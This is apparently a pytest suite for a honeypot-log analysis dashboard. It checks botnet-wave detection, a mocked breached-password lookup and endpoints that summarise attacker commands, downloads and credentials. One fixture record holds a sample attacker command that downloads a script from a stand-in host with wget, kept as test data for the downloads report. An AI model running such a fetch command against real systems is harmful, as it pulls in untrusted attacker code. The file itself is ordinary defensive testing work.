import base64
import hashlib

import pytest

from analysis import botnet_detector, hibp_check
from api.app import create_app
from api.routes import analysis as analysis_route
from parser import db

AUTH = {"Authorization": "Basic " + base64.b64encode(b"tester:secret").decode()}


@pytest.fixture
def client(tmp_path, monkeypatch):
    db_path = tmp_path / "an.db"
    monkeypatch.setenv("DATABASE_PATH", str(db_path))
    monkeypatch.setenv("DASHBOARD_USER", "tester")
    monkeypatch.setenv("DASHBOARD_PASSWORD", "secret")
    db.init_db(str(db_path))
    conn = db.get_connection(str(db_path))
    # one coordinated wave: 6 distinct IPs in the same minute
    for i in range(6):
        db.insert_attack(conn, timestamp="2026-06-22T11:24:30Z", src_ip="192.0.2." + str(i),
                         event_type="cowrie.login.failed", username="root", password="123456",
                         asn="AS64500 Testnet", org="TestOrg")
    db.insert_attack(conn, timestamp="2026-06-22T11:30:00Z", src_ip="192.0.2.50",
                     event_type="cowrie.command.input", raw_command="uname -a")
    db.insert_attack(conn, timestamp="2026-06-22T11:31:00Z", src_ip="192.0.2.51",
                     event_type="cowrie.command.input", raw_command="uname -a")
    db.insert_attack(conn, timestamp="2026-06-22T11:32:00Z", src_ip="192.0.2.52",
                     event_type="cowrie.command.input", raw_command="wget http://evil.example/x.sh")
    conn.commit()
    conn.close()
    analysis_route._hibp_cache.clear()
    app = create_app()
    app.config["TESTING"] = True
    return app.test_client()


def test_botnet_detector(tmp_path):
    db_path = tmp_path / "b.db"
    db.init_db(str(db_path))
    conn = db.get_connection(str(db_path))
    for i in range(6):
        db.insert_attack(conn, timestamp="2026-06-22T11:24:30Z", src_ip="192.0.2." + str(i),
                         event_type="cowrie.login.failed")
    conn.commit()
    waves = botnet_detector.detect_botnets(conn, min_ips=5)
    conn.close()
    assert waves and waves[0]["ip_count"] == 6


def test_hibp_check(monkeypatch):
    suffix = hashlib.sha1(b"password").hexdigest().upper()[5:]

    class FakeResp:
        text = suffix + ":24230577\nFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF:1"

        def raise_for_status(self):
            pass

    monkeypatch.setattr(hibp_check.requests, "get", lambda *a, **k: FakeResp())
    assert hibp_check.check_password("password") == 24230577
    assert hibp_check.check_password("") == 0


def test_commands_endpoint(client):
    rows = client.get("/api/analysis/commands", headers=AUTH).get_json()
    assert rows[0]["value"] == "uname -a" and rows[0]["count"] == 2


def test_botnet_endpoint(client):
    waves = client.get("/api/analysis/botnet", headers=AUTH).get_json()
    assert any(w["ip_count"] == 6 for w in waves)


def test_downloads_endpoint(client):
    rows = client.get("/api/analysis/downloads", headers=AUTH).get_json()
    assert any("wget" in r["value"] for r in rows)


def test_providers_endpoint(client):
    rows = client.get("/api/analysis/providers", headers=AUTH).get_json()
    assert rows and rows[0]["value"] == "AS64500 Testnet"


def test_timeline_endpoint(client):
    rows = client.get("/api/analysis/timeline", headers=AUTH).get_json()
    assert rows and rows[0]["day"] == "2026-06-22"
    assert rows[0]["count"] >= 6


def test_attackers_endpoint(client):
    rows = client.get("/api/analysis/attackers", headers=AUTH).get_json()
    assert rows
    top = rows[0]
    assert top["count"] >= 1
    assert top["first_seen"] <= top["last_seen"]


def test_passwords_endpoint(client, monkeypatch):
    monkeypatch.setattr(analysis_route.hibp_check, "check_password", lambda pw: 999)
    rows = client.get("/api/analysis/passwords", headers=AUTH).get_json()
    assert rows[0]["value"] == "123456" and rows[0]["pwned"] == 999


def test_csv_export(client):
    assert client.get("/api/export/csv").status_code == 401
    resp = client.get("/api/export/csv", headers=AUTH)
    assert resp.status_code == 200
    assert resp.mimetype == "text/csv"
    body = resp.get_data(as_text=True)
    assert body.startswith("timestamp,src_ip,country")
    assert "uname -a" in body
